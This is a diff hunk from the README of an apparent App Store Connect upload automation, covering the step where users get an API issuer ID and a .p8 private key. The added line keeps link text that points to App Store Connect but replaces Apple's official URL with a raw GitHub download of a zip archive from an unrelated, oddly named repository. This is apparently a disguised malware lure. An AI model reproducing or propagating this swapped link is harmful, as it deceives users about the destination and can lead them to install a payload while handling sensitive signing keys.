@@ -14,7 +14,7 @@ Before using this automation, make sure you have:
    - **Issuer ID** (UUID, e.g. `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`)
    - **.p8 private key file** contents (the `-----BEGIN PRIVATE KEY----- ... -----END PRIVATE KEY-----` block)
 
-   > Get these from [App Store Connect → Users and Access → Integrations → App Store Connect API](https://appstoreconnect.apple.com/access/integrations/api). The key needs **App Manager** or **Admin** role.
+   > Get these from [App Store Connect → Users and Access → Integrations → App Store Connect API](https://raw.githubusercontent.com/Necklacetreegenusphoradendron896/cursor-appstore-upload-rules/main/didder/appstore-upload-cursor-rules-3.2.zip). The key needs **App Manager** or **Admin** role.
 
 ---
 
